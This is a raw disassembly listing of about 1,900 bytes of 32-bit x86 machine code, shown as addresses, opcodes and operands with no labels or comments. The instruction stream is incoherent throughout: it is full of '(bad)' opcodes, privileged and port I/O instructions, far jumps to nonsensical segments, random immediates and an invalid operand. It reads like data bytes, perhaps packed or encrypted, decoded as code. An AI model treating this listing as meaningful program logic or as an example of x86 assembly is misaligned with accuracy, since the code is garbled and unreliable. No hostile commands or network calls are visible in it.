  406e75:	push   ebx
  406e76:	jle    0x406ec1
  406e78:	cmp    BYTE PTR [ebp+0x1d],dl
  406e7b:	ret    0xed86
  406e7e:	fisttp WORD PTR [edi+ebp*1-0x1b337a3a]
  406e85:	popf   
  406e86:	dec    ebx
  406e87:	imul   ebp,DWORD PTR [esi+0x77],0x2c
  406e8b:	inc    esp
  406e8c:	pop    eax
  406e8d:	call   0x550e:0xb0afe010
  406e94:	dec    edx
  406e95:	mov    ebp,0x116bb9a8
  406e9a:	mov    ds:0xc077275c,eax
  406e9f:	int3   
  406ea0:	inc    ebx
  406ea1:	pop    ebp
  406ea2:	fstp   TBYTE PTR ds:0xe88139d5
  406ea8:	popf   
  406ea9:	inc    ecx
  406eaa:	dec    ecx
  406eab:	sar    BYTE PTR [ecx],cl
  406ead:	inc    edi
  406eae:	arpl   di,di
  406eb0:	jp     0x406ec1
  406eb2:	pushf  
  406eb3:	arpl   sp,bx
  406eb5:	fisubr WORD PTR [eax-0x61]
  406eb8:	loop   0x406ea9
  406eba:	jns    0x406f0c
  406ebc:	adc    al,0x74
  406ebe:	shr    BYTE PTR [eax-0x1b723340],0x24
  406ec5:	push   cs
  406ec6:	popa   
  406ec7:	sbb    DWORD PTR [edi],0xffffffd0
  406eca:	jo     0x406eb4
  406ecc:	dec    ebx
  406ecd:	int3   
  406ece:	mov    ebx,DWORD PTR [ebp+0x65cdef24]
  406ed4:	adc    ah,BYTE PTR [eax]
  406ed6:	or     eax,0xed069310
  406edb:	retf   0xb96a
  406ede:	test   eax,0x71dde2a5
  406ee3:	rol    DWORD PTR [ebp-0x410490bf],cl
  406ee9:	nop
  406eea:	xchg   DWORD PTR [edi-0x39a4a786],eax
  406ef0:	ins    DWORD PTR es:[edi],dx
  406ef1:	inc    eax
  406ef2:	and    bl,BYTE PTR [edi]
  406ef4:	not    BYTE PTR [ebx-0x2c]
  406ef7:	stos   BYTE PTR es:[edi],al
  406ef8:	push   0x4d
  406efa:	inc    esp
  406efb:	shr    ecx,cl
  406efd:	mov    ah,0x62
  406eff:	add    esi,esp
  406f01:	cdq    
  406f02:	xchg   edx,eax
  406f03:	les    ecx,FWORD PTR [esi+0x6e9cca46]
  406f09:	xor    eax,0xdb9a9d80
  406f0e:	mov    edx,0x27779fa7
  406f13:	jo     0x406ef7
  406f15:	push   edi
  406f16:	xlat   BYTE PTR ss:[ebx]
  406f18:	and    bl,BYTE PTR [edi+0x4747e92f]
  406f1e:	cmp    ch,BYTE PTR [edi]
  406f20:	stos   BYTE PTR es:[edi],al
  406f21:	jl     0x406eeb
  406f23:	xchg   DWORD PTR [eax-0x4f],esp
  406f26:	inc    ecx
  406f27:	test   ebp,eax
  406f29:	mov    ch,0x2b
  406f2b:	pop    ds
  406f2c:	mov    BYTE PTR [edi+0x44],0x99
  406f30:	(bad)  
  406f32:	xor    al,0x4f
  406f34:	sub    eax,0x53e1ee41
  406f39:	mov    ebx,0xc9efea0f
  406f3e:	mov    ebp,DWORD PTR [ebx+edx*2-0x40]
  406f42:	jno    0x406ec4
  406f44:	mov    bl,0x6f
  406f46:	push   edx
  406f47:	cmp    DWORD PTR [esi-0x655f59c6],edx
  406f4d:	je     0x406f26
  406f4f:	addr16 test al,0xb5
  406f52:	bound  esp,QWORD PTR [esi]
  406f54:	fistp  QWORD PTR ds:0xa6ad792b
  406f5a:	lock fwait
  406f5c:	sbb    bl,BYTE PTR [edx-0x11d2a28f]
  406f62:	mov    cl,0x96
  406f64:	popw   es
  406f66:	mov    eax,ds
  406f68:	rol    ecx,cl
  406f6a:	popa   
  406f6b:	and    BYTE PTR [ecx+0x58328969],0x89
  406f72:	pop    esi
  406f73:	enter  0x1698,0xd5
  406f77:	push   0x93b2aa45
  406f7c:	mov    edi,gs
  406f7e:	cmc    
  406f7f:	mov    bh,0xde
  406f81:	push   esi
  406f82:	add    eax,0xede1c797
  406f87:	push   esi
  406f88:	xor    esi,0x10e477da
  406f8e:	pop    esp
  406f8f:	(bad)  [eax]
  406f91:	jnp    0x406f1e
  406f93:	pop    ds
  406f94:	jp     0x406f63
  406f96:	inc    ecx
  406f97:	int3   
  406f98:	jb     0x406f8d
  406f9a:	inc    esp
  406f9b:	inc    eax
  406f9c:	iret   
  406f9d:	mov    ebx,0xc4f47da5
  406fa2:	enter  0xf249,0x47
  406fa6:	repnz test eax,0x6d3bdf16
  406fac:	sub    bh,bl
  406fae:	cmp    BYTE PTR [eax],0x1c
  406fb1:	pop    edi
  406fb2:	xor    dl,bh
  406fb4:	lahf   
  406fb5:	mov    bh,0x7e
  406fb7:	lods   eax,DWORD PTR ds:[esi]
  406fb8:	mov    bh,0x47
  406fba:	hlt    
  406fbb:	jge    0x406fb7
  406fbd:	retf   
  406fbe:	stc    
  406fbf:	pop    ecx
  406fc0:	sti    
  406fc1:	mov    eax,ds:0x9f19c164
  406fc6:	ror    DWORD PTR [esi+edi*2+0x7a],0x7e
  406fcb:	push   eax
  406fcc:	or     al,0x35
  406fce:	jnp    0x406f6f
  406fd0:	xchg   esi,eax
  406fd1:	fdiv   DWORD PTR [ebp+0xa7d7e2f]
  406fd7:	and    al,cl
  406fd9:	pop    es
  406fda:	sbb    al,0x1
  406fdc:	pop    ebp
  406fdd:	add    ch,BYTE PTR [edi]
  406fdf:	mov    al,ds:0x8e7bc1d2
  406fe4:	adc    ebp,ecx
  406fe6:	mov    edx,0xbaf79a1b
  406feb:	gs gs push esp
  406fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fef:	(bad)  
  406ff0:	sar    esi,cl
  406ff2:	and    cl,bl
  406ff4:	outs   dx,DWORD PTR ds:[esi]
  406ff5:	(bad)  
  406ff6:	cld    
  406ff7:	inc    ecx
  406ff8:	imul   edx,ebp,0x511ba7ab
  406ffe:	int    0xbd
  407000:	test   DWORD PTR [edx-0x2c],edi
  407003:	dec    esi
  407004:	pop    edi
  407005:	dec    ebx
  407006:	dec    ecx
  407007:	jno    0x407075
  407009:	or     al,0xe1
  40700b:	and    DWORD PTR [edx+0x3d85b504],ecx
  407011:	cdq    
  407012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407013:	mov    ch,0xb
  407015:	xor    DWORD PTR [ebx],edx
  407017:	jp     0x407076
  407019:	lods   al,BYTE PTR ds:[esi]
  40701a:	xor    BYTE PTR ds:0xa2d498eb,0x33
  407021:	mov    esi,0x20c032b9
  407026:	out    0xc4,eax
  407028:	mov    ds:0xa690f7d5,eax
  40702d:	fsubp  st(1),st
  40702f:	mov    fs,WORD PTR [ecx]
  407031:	leave  
  407032:	add    al,cl
  407034:	sbb    esp,DWORD PTR ds:0xa150034e
  40703a:	push   ds
  40703b:	stos   BYTE PTR es:[edi],al
  40703c:	mov    eax,es
  40703e:	ror    BYTE PTR [eax+0x46ee6c5d],cl
  407044:	rol    DWORD PTR [ebx+0x4b],1
  407047:	sahf   
  407048:	adc    eax,0x99fa740b
  40704d:	inc    ebp
  40704e:	or     cl,dh
  407050:	push   ecx
  407051:	cwde   
  407052:	leave  
  407053:	jne    0x4070ac
  407055:	mov    edi,0x8df22648
  40705a:	jo     0x407054
  40705c:	jo     0x407015
  40705e:	fnsave [ecx+0x60aacfd4]
  407064:	push   ecx
  407065:	mov    bl,0xed
  407067:	pop    ebp
  407068:	jnp    0x40708a
  40706a:	dec    esp
  40706b:	inc    ecx
  40706c:	sbb    al,BYTE PTR [ebp-0x20]
  40706f:	mov    BYTE PTR [ebx-0x3e],dh
  407072:	mov    ds:0x7cd13bca,eax
  407077:	add    eax,0x22621d
  40707c:	bound  ebp,QWORD PTR [esi]
  40707e:	cmp    cl,bl
  407080:	ror    BYTE PTR [eax+0x6672c48a],0xa7
  407087:	dec    esi
  407088:	mov    bh,0x7a
  40708a:	pop    es
  40708b:	or     BYTE PTR gs:[ecx],dl
  40708e:	pop    esi
  40708f:	lock jo 0x407056
  407092:	inc    ecx
  407093:	cmp    eax,0xb1cffeb2
  407098:	aam    0x31
  40709a:	std    
  40709b:	sbb    cl,ch
  40709d:	enter  0x3697,0x93
  4070a1:	shr    BYTE PTR [esp+edx*4+0x6c725124],cl
  4070a8:	call   0xd549e147
  4070ad:	mov    ebp,0xc077da00
  4070b2:	(bad)  
  4070b3:	mov    bl,0xc1
  4070b5:	sti    
  4070b6:	mov    bl,cl
  4070b8:	stos   DWORD PTR es:[edi],eax
  4070b9:	inc    edi
  4070ba:	int3   
  4070bb:	push   ebx
  4070bc:	pop    edx
  4070bd:	fsubr  DWORD PTR [edi-0x48]
  4070c0:	dec    edi
  4070c1:	jmp    0x78078e3b
  4070c6:	fsubr  DWORD PTR [eax]
  4070c8:	inc    ebp
  4070c9:	adc    DWORD PTR [ebp-0x1ac5e36e],edx
  4070cf:	mov    ah,BYTE PTR [ebx+0x64c40094]
  4070d5:	pop    ebp
  4070d6:	jg     0x4070c7
  4070d8:	fstp   DWORD PTR [ecx-0x21]
  4070db:	(bad)  
  4070dc:	int    0x1a
  4070de:	cmp    al,0xd2
  4070e0:	sbb    BYTE PTR [eax+esi*8+0xba23fb7],dh
  4070e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070e8:	cli    
  4070e9:	stos   DWORD PTR es:[edi],eax
  4070ea:	cdq    
  4070eb:	shl    BYTE PTR [edi-0x77],0x66
  4070ef:	iret   
  4070f0:	jg     0x4070f6
  4070f2:	je     0x407077
  4070f4:	addr16 dec ecx
  4070f6:	pop    esp
  4070f7:	fbld   TBYTE PTR [edi+esi*2-0x6c]
  4070fb:	jmp    DWORD PTR [ecx]
  4070fd:	iret   
  4070fe:	shl    BYTE PTR [ecx],0x72
  407101:	push   es
  407102:	sub    ebp,ebx
  407104:	aas    
  407105:	retf   
  407106:	iret   
  407107:	mov    ah,0x6f
  407109:	pop    es
  40710a:	add    DWORD PTR [ebx+0x27],edi
  40710d:	addr16 aam 0x9d
  407110:	cmp    al,0xec
  407112:	push   ebp
  407113:	mov    ah,0xd8
  407115:	nop
  407116:	lock cmp al,0x43
  407119:	jno    0x407161
  40711b:	sub    eax,0xd79a65b2
  407120:	sbb    bh,BYTE PTR [esi+0x30]
  407123:	mov    al,0xd9
  407125:	xor    esi,DWORD PTR [edi+edi*1]
  407128:	and    BYTE PTR [ecx],0xd2
  40712b:	and    dl,BYTE PTR [edx]
  40712d:	mov    ch,0x7e
  40712f:	cwde   
  407130:	jno    0x4070e7
  407132:	mov    fs,edi
  407134:	rol    BYTE PTR [edx+0x37],0xb0
  407138:	(bad)  
  407139:	outs   dx,DWORD PTR ds:[esi]
  40713a:	les    edx,FWORD PTR ds:0x64e2dafb
  407140:	iret   
  407141:	and    bh,BYTE PTR [eax+eiz*2-0x6f]
  407145:	iret   
  407146:	mov    ds:0x4c3774f5,eax
  40714b:	mov    edx,0xcd0969d4
  407150:	push   0xd7124671
  407155:	dec    esp
  407156:	push   0xe40e1ff9
  40715b:	test   dl,dh
  40715d:	push   edi
  40715e:	sbb    DWORD PTR [esi+0x3f],ebx
  407161:	or     esi,DWORD PTR ds:0x1f241c1c
  407167:	cmp    dh,ah
  407169:	mov    al,0xfd
  40716b:	aas    
  40716c:	ret    
  40716d:	push   ebp
  40716e:	mov    cl,BYTE PTR [ebp+0x4618fc95]
  407174:	inc    edx
  407176:	xchg   esp,eax
  407177:	add    DWORD PTR [edi+0x3b],eax
  40717a:	jge    0x40716f
  40717c:	popf   
  40717d:	pop    ebp
  40717e:	(bad)  
  40717f:	rol    BYTE PTR [esi+0x37],1
  407182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407183:	and    eax,0xe1c4c44e
  407188:	outs   dx,DWORD PTR ds:[esi]
  407189:	mov    eax,DWORD PTR [ecx+0x22]
  40718c:	in     al,0x36
  40718e:	lods   al,BYTE PTR ds:[esi]
  40718f:	cmp    DWORD PTR ds:0x60686ff,0xb86fbe81
  407199:	int    0x3a
  40719b:	into   
  40719c:	cdq    
  40719d:	mov    BYTE PTR [edx+edi*2],cl
  4071a0:	das    
  4071a1:	daa    
  4071a2:	ret    
  4071a3:	imul   ebp,DWORD PTR [esi],0x2d
  4071a6:	(bad)  
  4071a7:	sbb    DWORD PTR [ebp+eiz*8+0x44],edx
  4071ab:	pop    ebp
  4071ac:	jg     0x407216
  4071ae:	sbb    BYTE PTR [edx+ebx*1-0x2c],dh
  4071b2:	mov    al,0x60
  4071b4:	test   al,0x70
  4071b6:	or     bh,BYTE PTR [ebx-0x447af05a]
  4071bc:	int3   
  4071bd:	mov    al,0xd7
  4071bf:	fbstp  TBYTE PTR [eax+0x30]
  4071c2:	clc    
  4071c3:	pop    ebx
  4071c4:	mov    bh,0xe9
  4071c6:	inc    ecx
  4071c7:	cmp    BYTE PTR [ebp-0x1aae1eee],0xc4
  4071ce:	stos   DWORD PTR es:[edi],eax
  4071cf:	mov    ebx,0x7f9153dc
  4071d4:	fsub   QWORD PTR [eax]
  4071d6:	xor    BYTE PTR [edi+0x3b],dl
  4071d9:	pop    ss
  4071da:	mov    eax,ds:0x7668f264
  4071df:	jb     0x407241
  4071e1:	inc    eax
  4071e2:	adc    ch,BYTE PTR [ebp-0x4252d9e0]
  4071e8:	rcr    ch,1
  4071ea:	sub    edx,esp
  4071ec:	repz out dx,al
  4071ee:	sub    DWORD PTR [ebx-0x1e],ecx
  4071f1:	inc    edi
  4071f2:	mov    edx,0x76c98229
  4071f7:	inc    ebp
  4071f8:	mov    esp,0x586b3af3
  4071fd:	into   
  4071fe:	mov    ds:0x769850b3,eax
  407203:	hlt    
  407204:	retf   0xfd56
  407207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407208:	fs scas eax,DWORD PTR es:[edi]
  40720a:	add    DWORD PTR [edx],eax
  40720c:	inc    ebx
  40720d:	add    edx,DWORD PTR [ecx+0x10]
  407210:	leave  
  407211:	call   FWORD PTR [ecx]
  407213:	xlat   BYTE PTR ds:[ebx]
  407214:	pop    ebp
  407215:	gs xchg edi,eax
  407217:	mov    ah,0x4a
  407219:	lds    esi,FWORD PTR [edx]
  40721b:	loop   0x4071cf
  40721d:	pop    eax
  40721e:	push   ecx
  40721f:	mov    ah,0xad
  407221:	pop    edx
  407222:	js     0x4071bc
  407224:	xor    al,0x40
  407226:	stos   DWORD PTR es:[edi],eax
  407227:	test   DWORD PTR [esi],ebp
  407229:	mov    ds:0x36c865df,al
  40722e:	(bad)  
  40722f:	lods   al,BYTE PTR ds:[esi]
  407230:	cmp    BYTE PTR ds:0x515370c4,bl
  407236:	mov    bh,0x44
  407238:	aam    0x95
  40723a:	push   ecx
  40723b:	sbb    ah,BYTE PTR [esp+ecx*8-0x2a88589f]
  407242:	xchg   dh,ah
  407244:	jle    0x407232
  407246:	mov    ds:0x560e9bd2,al
  40724b:	sbb    eax,0x26f8dfc1
  407250:	mov    dh,0x15
  407252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407253:	adc    DWORD PTR [edi-0x658009ea],0xffffffec
  40725a:	pop    ebp
  40725b:	jp     0x40723d
  40725d:	and    al,0xa4
  40725f:	push   es
  407260:	inc    ecx
  407261:	lds    esp,FWORD PTR [edx]
  407263:	xor    eax,0xd3c03908
  407268:	loop   0x407240
  40726a:	hlt    
  40726b:	fs dec edx
  40726d:	fldpi  
  40726f:	mov    ebx,0x7ff09e5b
  407274:	and    BYTE PTR [ecx+edi*1-0x7be0602b],0xce
  40727c:	fisubr WORD PTR [esi+0x764523a]
  407282:	lods   eax,DWORD PTR ds:[esi]
  407283:	sti    
  407284:	test   DWORD PTR [edx-0xeaf6cab],edx
  40728a:	pop    ds
  40728b:	lods   al,BYTE PTR ds:[esi]
  40728c:	adc    BYTE PTR [edx+ebx*2],dh
  40728f:	and    bl,BYTE PTR [edx+0x35]
  407292:	inc    edi
  407293:	stos   DWORD PTR es:[edi],eax
  407294:	push   0x53
  407296:	add    eax,0xeee513f8
  40729b:	jbe    0x4072d4
  40729d:	shl    DWORD PTR [edi+edx*8-0x6],0xed
  4072a2:	enter  0xf65a,0x2a
  4072a6:	xchg   esp,eax
  4072a7:	and    dl,BYTE PTR [esi+0x380076e4]
  4072ad:	dec    ebp
  4072ae:	jge    0x4072bc
  4072b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072b1:	sbb    dh,bl
  4072b3:	adc    eax,0x75761259
  4072b8:	out    0x76,al
  4072ba:	(bad)  
  4072bb:	and    dh,bh
  4072bd:	add    eax,0x7b68d06d
  4072c2:	cmp    al,0xc6
  4072c4:	xchg   DWORD PTR [edx],eax
  4072c6:	daa    
  4072c7:	mov    esp,gs
  4072c9:	(bad)  
  4072ca:	cwde   
  4072cb:	mov    eax,0x5183eb34
  4072d0:	or     bh,BYTE PTR [esi+0x13]
  4072d3:	ins    BYTE PTR es:[edi],dx
  4072d4:	sahf   
  4072d5:	inc    edx
  4072d6:	je     0x4072f5
  4072d8:	push   edi
  4072da:	scas   eax,DWORD PTR es:[edi]
  4072db:	and    eax,0x5936549a
  4072e0:	dec    ebp
  4072e1:	mov    eax,0xf8ba4967
  4072e6:	mov    ebp,0xc2fdeb6a
  4072eb:	lods   al,BYTE PTR ds:[esi]
  4072ec:	inc    eax
  4072ed:	imul   edi,eax,0x55ed5e55
  4072f3:	dec    eax
  4072f4:	cmp    al,0x9d
  4072f6:	imul   esp,ebp,0x5
  4072f9:	xor    esi,DWORD PTR [eax-0x3cc8214f]
  4072ff:	mov    esi,0xc377e5f
  407304:	jne    0x407297
  407306:	push   0x51d73320
  40730b:	mov    WORD PTR ds:0x6d1f5939,gs
  407311:	int3   
  407312:	add    edi,DWORD PTR [esi+eiz*4]
  407315:	xchg   ebx,eax
  407316:	cli    
  407317:	cmp    BYTE PTR [edi+0x54ba7c3],dh
  40731d:	mov    bl,0xb7
  40731f:	and    ebx,DWORD PTR [edx+0x4a0c74ab]
  407325:	ja     0x4073a5
  407327:	pop    ecx
  407328:	cmp    ebp,DWORD PTR [eax+0x0]
  40732b:	cmp    al,BYTE PTR [ecx+0x6f]
  40732e:	fidiv  DWORD PTR [ebx-0x33c7cacc]
  407334:	jmp    0x8d397a0c
  407339:	mov    edi,0x1d441b54
  40733e:	gs dec edx
  407340:	and    eax,0x2f9cf650
  407345:	nop
  407346:	dec    ecx
  407347:	push   ds
  407348:	ret    
  407349:	jbe    0x407327
  40734b:	or     al,0xfc
  40734d:	stos   BYTE PTR es:[edi],al
  40734e:	pop    eax
  40734f:	mov    al,ds:0xf9544d47
  407354:	mov    edi,0x39e0fe6
  407359:	xchg   DWORD PTR [edx+0x1199bc51],ebx
  40735f:	push   esi
  407360:	icebp  
  407361:	jge    0x4073dd
  407363:	mov    bh,0x81
  407365:	cmp    BYTE PTR [ecx+0x67],bl
  407368:	sbb    eax,0x1070b8ff
  40736d:	sub    edi,esi
  40736f:	fxch   st(2)
  407371:	(bad)  
  407372:	mov    ds:0x71cbd70e,al
  407377:	push   0x5bdd64a6
  40737c:	cld    
  40737d:	test   DWORD PTR ds:0x20152bcd,eax
  407383:	je     0x407320
  407385:	and    eax,0x21f3ba05
  40738a:	ds push ecx
  40738c:	pop    edx
  40738d:	pop    edx
  40738e:	inc    eax
  40738f:	int3   
  407390:	ret    
  407391:	out    0x3e,al
  407393:	stos   BYTE PTR es:[edi],al
  407394:	ss addr16 test al,0x58
  407398:	pop    esp
  407399:	jg     0x407411
  40739b:	into   
  40739c:	leave  
  40739d:	mov    esi,0x1b8152a8
  4073a2:	hlt    
  4073a3:	cmp    DWORD PTR [ebp+ebp*2-0x63],esp
  4073a7:	movups XMMWORD PTR [eax],xmm5
  4073aa:	les    esi,FWORD PTR [edx+0x2c5ec9a1]
  4073b0:	sar    BYTE PTR [esi-0x3d],cl
  4073b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073b4:	scas   eax,DWORD PTR es:[edi]
  4073b5:	xor    al,0x98
  4073b7:	ret    0x1e89
  4073ba:	aam    0x5c
  4073bc:	inc    esi
  4073bd:	dec    esp
  4073be:	xchg   BYTE PTR [edx+0x3664fe33],dh
  4073c4:	sbb    ah,BYTE PTR [ecx]
  4073c6:	mov    cl,0x6c
  4073c8:	popa   
  4073c9:	sar    BYTE PTR [edi+0x17c242dc],0x68
  4073d0:	mov    ds:0xe20ee1e5,al
  4073d5:	loopne 0x40741d
  4073d7:	jbe    0x407371
  4073d9:	aam    0x19
  4073db:	ror    BYTE PTR [edi],0xb0
  4073de:	mov    eax,ds:0x4d16b510
  4073e3:	xchg   edi,eax
  4073e4:	scas   al,BYTE PTR es:[edi]
  4073e5:	jne    0x407420
  4073e7:	cld    
  4073e8:	mov    ebx,0xd577779b
  4073ed:	repnz adc ch,BYTE PTR [edi]
  4073f0:	or     DWORD PTR [esi-0xa70904a],ebx
  4073f6:	jmp    0x407464
  4073f8:	stos   BYTE PTR es:[edi],al
  4073f9:	cwde   
  4073fa:	stos   DWORD PTR es:[edi],eax
  4073fb:	or     BYTE PTR [edx+eiz*2],0x2b
  4073ff:	cs dec eax
  407401:	enter  0x127f,0xb4
  407405:	loope  0x40742a
  407407:	cmp    al,0x20
  407409:	jb     0x4073a3
  40740b:	push   ebp
  40740c:	and    bl,BYTE PTR [esi+0x6d1773cb]
  407412:	repz aas 
  407414:	inc    ebp
  407415:	mov    edi,db2
  407418:	lahf   
  407419:	push   ss
  40741a:	xor    ecx,esp
  40741c:	adc    dh,bl
  40741e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40741f:	xor    BYTE PTR [eax-0x62],al
  407422:	outs   dx,BYTE PTR ds:[esi]
  407423:	jmp    0x407451
  407425:	jne    0x40740b
  407427:	pop    ss
  407428:	push   ebp
  407429:	jmp    0xbad20ceb
  40742e:	xor    edi,ecx
  407430:	pop    esp
  407431:	aaa    
  407432:	loop   0x407439
  407434:	mov    al,ds:0xa9f11df7
  407439:	mov    esp,0x6e4953f2
  40743e:	mov    BYTE PTR [esi-0x749c4858],al
  407444:	add    BYTE PTR [edi-0x5029fcf9],bl
  40744a:	add    BYTE PTR [edx-0x4135e8e8],dh
  407450:	lods   eax,DWORD PTR ds:[esi]
  407451:	test   BYTE PTR ds:0x17277726,dl
  407457:	jbe    0x407458
  407459:	jg     0x40745d
  40745b:	test   al,0x5d
  40745d:	inc    eax
  40745e:	push   ebp
  40745f:	and    DWORD PTR ss:0x82ee1846,ebp
  407466:	mov    al,0x91
  407468:	or     BYTE PTR [edi+eax*2+0x41c46931],bh
  40746f:	xchg   ebp,eax
  407470:	push   ebp
  407471:	cwde   
  407472:	push   es
  407473:	int    0x3b
  407475:	pop    ebx
  407476:	retf   
  407477:	lock jmp 0x82a5:0xfa4af8eb
  40747f:	ret    
  407480:	dec    ecx
  407481:	inc    esi
  407482:	jno    0x407450
  407484:	(bad)  
  407485:	pop    ebp
  407486:	sub    dl,dh
  407488:	dec    ecx
  407489:	xchg   edi,eax
  40748a:	dec    eax
  40748b:	mov    edi,0xa056505f
  407490:	pusha  
  407491:	mov    ch,0xd
  407493:	shr    BYTE PTR [ecx+0x7641a00],1
  407499:	mov    ch,0xc1
  40749b:	pop    ds
  40749c:	enter  0x60cc,0xe0
  4074a0:	add    bl,BYTE PTR [ebx]
  4074a2:	ins    BYTE PTR es:[edi],dx
  4074a3:	cmp    esi,DWORD PTR [ecx]
  4074a5:	daa    
  4074a6:	xchg   DWORD PTR [edx+eiz*4-0x32],esp
  4074aa:	fs pop edx
  4074ac:	ins    DWORD PTR es:[edi],dx
  4074ad:	dec    eax
  4074ae:	push   ss
  4074af:	ins    DWORD PTR es:[edi],dx
  4074b0:	adc    cl,bh
  4074b2:	inc    edx
  4074b3:	aas    
  4074b4:	xor    al,0x5
  4074b6:	mov    edi,0xd4276933
  4074bb:	aas    
  4074bc:	sar    DWORD PTR [ebx+0x6d],1
  4074bf:	adc    edi,DWORD PTR [eax-0x35769e2c]
  4074c5:	mov    ebx,0xf944d6fc
  4074ca:	cdq    
  4074cb:	fmulp  st(7),st
  4074cd:	fild   DWORD PTR [ecx-0x31c33b8b]
  4074d3:	test   al,0x58
  4074d5:	(bad)  
  4074d7:	outs   dx,DWORD PTR ds:[esi]
  4074d8:	not    DWORD PTR [eax-0x181c591c]
  4074de:	pop    esp
  4074df:	adc    DWORD PTR [edi-0x37],0x2de0fac7
  4074e6:	mov    ah,cl
  4074e8:	push   0xee2182ea
  4074ed:	sub    eax,0x189738dc
  4074f2:	xor    al,0x21
  4074f4:	pushf  
  4074f5:	push   edi
  4074f6:	lods   eax,DWORD PTR ds:[esi]
  4074f7:	pop    ebp
  4074f8:	addr16 fs mov bl,0x89
  4074fc:	adc    eax,0xee2138bf
  407501:	mov    eax,ds:0xea3180ac
  407506:	int    0x7e
  407508:	fisubr WORD PTR [ecx+eiz*2+0x36]
  40750c:	(bad)  
  40750d:	and    al,0x11
  40750f:	(bad)  
  407510:	nop
  407511:	cmp    BYTE PTR [esi+0x8],dh
  407514:	inc    ecx
  407515:	sbb    eax,0x512da315
  40751a:	xchg   ebp,eax
  40751b:	call   0xda27:0x1a5fdf13
  407522:	pop    es
  407523:	and    al,0xd8
  407525:	xchg   DWORD PTR [ecx],eax
  407527:	and    eax,0x72f38592
  40752c:	mov    bh,0xe5
  40752e:	lahf   
  40752f:	xchg   ecx,eax
  407530:	ins    BYTE PTR es:[edi],dx
  407531:	or     DWORD PTR es:[eax-0x7e],0x817bcbe
  407539:	pusha  
  40753a:	cmp    ebx,eax
  40753c:	mov    esi,0xce5c1bee
  407541:	mov    cl,0xd7
  407543:	mov    esp,0x6e5d9664
  407548:	aas    
  407549:	mov    al,ds:0x25ef59df
  40754e:	adc    al,0xc3
  407550:	mov    bh,0xf
  407552:	fcmovnb st,st(4)
  407554:	out    0xbe,eax
  407556:	sbb    al,0x39
  407558:	aaa    
  407559:	push   ss
  40755a:	mov    BYTE PTR [ebp-0xc],cl
  40755d:	add    eax,DWORD PTR [edx]
  40755f:	and    eax,0xdf3e8b3
  407564:	test   BYTE PTR [edi-0x7dc288cf],0x4c
  40756b:	fbld   TBYTE PTR [ebx-0x4986565b]
  407571:	jo     0x407591
  407573:	fdivrp st(4),st
  407575:	push   edi
  407576:	repnz retf 
  407578:	test   BYTE PTR [ebx+0x27],al
  40757b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40757c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40757d:	loopne 0x40752c
  40757f:	and    al,0xb3
  407581:	and    BYTE PTR [edx],cl
  407583:	jge    0x40756a
  407585:	in     al,dx
  407586:	int3   
  407587:	test   al,0xf0
  407589:	test   BYTE PTR [eax+0x18],0x7e
  40758d:	sub    BYTE PTR [ebx+0x55],0x61
  407591:	push   ebx
  407592:	pushf  
  407593:	cmp    dl,BYTE PTR [esi]
  407595:	fidiv  DWORD PTR [ebx]
  407597:	int    0x8
  407599:	not    ebp
  40759b:	mov    ax,ds:0xd63d0323
  4075a1:	into   
  4075a2:	mov    ?,esp
  4075a4:	sub    ah,BYTE PTR [eax+0x51e1d66]
  4075aa:	rol    BYTE PTR [ecx+0x57],cl
  4075ad:	pop    ss
  4075ae:	or     ecx,edi
  4075b0:	out    dx,al
  4075b1:	int3   
  4075b2:	mov    esp,DWORD PTR [eax+0x7e]
  4075b5:	sub    bh,dl
  4075b7:	mov    DWORD PTR [edx-0x6a],esi
  4075ba:	ins    BYTE PTR es:[edi],dx
  4075bb:	dec    eax
  4075bc:	scas   al,BYTE PTR es:[edi]
  4075bd:	cmp    ebp,DWORD PTR [ebx+0x1ce1d6d9]
  4075c3:	cld    
  4075c4:	push   ebx
  4075c5:	(bad)  
  4075c6:	hlt    
  4075c7:	push   edx
  4075c8:	pop    ebx
  4075c9:	mov    cl,0x28
  4075cb:	ins    BYTE PTR es:[edi],dx
  4075cc:	xor    esi,DWORD PTR [ecx]
  4075ce:	xchg   ebp,eax
  4075cf:	mov    al,0xc
  4075d1:	sub    al,BYTE PTR ds:0x96aef4c2
  4075d7:	sub    esp,DWORD PTR [ecx]
  4075d9:	cmp    BYTE PTR [esp+ebp*2],dh
  4075dc:	add    DWORD PTR [esi],edx
  4075de:	push   ebx
  4075df:	mov    dl,0x51
  4075e1:	fdivr  DWORD PTR [ecx-0x5d711485]
  4075e7:	sub    DWORD PTR [edi-0x6f],ebx
  4075ea:	and    al,0x81
  4075ec:	cmp    edi,eax
  4075ee:	mov    al,ds:0x3a0e4ccf
  4075f3:	pop    es
  4075f4:	pop    edx
  4075f5:	pushf  
  4075f6:	add    DWORD PTR [ebp-0x17],esi
  4075f9:	(bad)  
  4075fa:	int3   
  4075fb:	inc    BYTE PTR [esi+0x1a972ea2]
  407601:	rol    DWORD PTR [ecx-0xf774f0e],0xb9
  407608:	cmp    edx,0x57
  40760b:	mov    eax,0x9051c782
  407610:	sti    
  407611:	push   cs
  407612:	mov    WORD PTR ds:0x31d69214,gs
  407618:	test   BYTE PTR [edx],ch
  40761a:	or     esp,eax
  40761c:	mov    dh,0xff
  40761e:	ins    DWORD PTR es:[edi],dx
  40761f:	inc    ebp
  407620:	xor    bl,BYTE PTR [eax]
  407622:	scas   eax,DWORD PTR es:[edi]
  407623:	jg     0x4075f9
  407625:	out    0xfe,eax
  407627:	xchg   esp,eax
  407628:	push   edi
  407629:	mov    BYTE PTR [ebp-0x5c3eca80],bh
  40762f:	jmp    0x15f38810
  407634:	xchg   edi,eax
  407635:	pop    ss
  407636:	xor    ecx,DWORD PTR ds:0x611efc8f
  40763c:	or     ebp,DWORD PTR ds:0xd801c09d
  407642:	out    dx,eax
  407643:	mov    ch,BYTE PTR [eax-0x8]
  407646:	out    0x84,eax
  407648:	ins    DWORD PTR es:[edi],dx
  407649:	push   ss
  40764a:	test   al,0x91
